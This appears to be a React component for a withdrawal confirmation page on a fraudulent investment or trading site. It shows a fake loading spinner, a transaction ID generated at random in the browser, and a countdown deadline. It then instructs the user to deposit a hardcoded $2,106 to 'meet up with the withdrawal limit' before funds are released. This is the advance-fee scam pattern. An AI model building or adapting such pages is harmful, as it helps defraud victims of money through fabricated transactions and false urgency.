import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";

export default function WithdrawalPending() {
  const location = useLocation();
  const state = location.state || {};

  // Values passed from Dashboard
  const method = state.method || "Wire Transfer";
  const amount = state.amount || 0;
  const accountName = state.accountName || "Not provided";
  const accountNumber = state.accountNumber || "Not provided";
  const bankName = state.bankName || "Not provided";

  const [loading, setLoading] = useState(true);

  // Generate random transaction ID
  const transactionId = "TXN-" + Math.floor(Math.random() * 1000000000);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Deposit deadline (6 hours from now)
  const depositDeadline = new Date(Date.now() + 6 * 60 * 60 * 1000);
  // Withdrawal timeline (15 minutes after deposit deadline)
  const withdrawalTimeline = new Date(
    depositDeadline.getTime() + 15 * 60 * 1000
  );

  if (loading) {
    // Full page loader
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-900">
        <div className="w-20 h-20 border-8 border-teal-400 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 flex items-center justify-center p-6">
      <div className="max-w-4xl w-full bg-gray-800 shadow-2xl rounded-xl p-12 border border-teal-500">
        <h1 className="text-4xl font-bold text-center text-teal-400 mb-10">
          Withdrawal Confirmation
        </h1>

        {/* Transaction Details */}
        <div className="space-y-6 mb-10">
          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
            <label className="block text-sm text-gray-400">
              Transaction ID
            </label>
            <p className="text-lg font-semibold text-white">{transactionId}</p>
          </div>

          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
            <label className="block text-sm text-gray-400">Method</label>
            <p className="text-lg font-semibold text-white">{method}</p>
          </div>

          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
            <label className="block text-sm text-gray-400">
              Wire Transfer Amount
            </label>
            <p className="text-lg font-semibold text-white">${amount}</p>
          </div>

          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
            <label className="block text-sm text-gray-400">
              Deposit Deadline
            </label>
            <p className="text-lg font-semibold text-white">
              {depositDeadline.toLocaleString()}
            </p>
          </div>

          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
            <label className="block text-sm text-gray-400">
              Withdrawal Timeline
            </label>
            <p className="text-lg font-semibold text-white">
              {withdrawalTimeline.toLocaleString()}
            </p>
          </div>
        </div>

        {/* Instruction */}
        <div className="bg-gray-700 p-6 rounded-lg border border-red-500 text-center">
          <p className="text-xl font-semibold text-red-400">
            Instruction: Please deposit <strong>$2,106</strong> into your
            account to meet up with the withdrawal limit before{" "}
            <strong>{depositDeadline.toLocaleString()}</strong> to complete the
            withdrawal.
          </p>
        </div>
      </div>
    </div>
  );
}
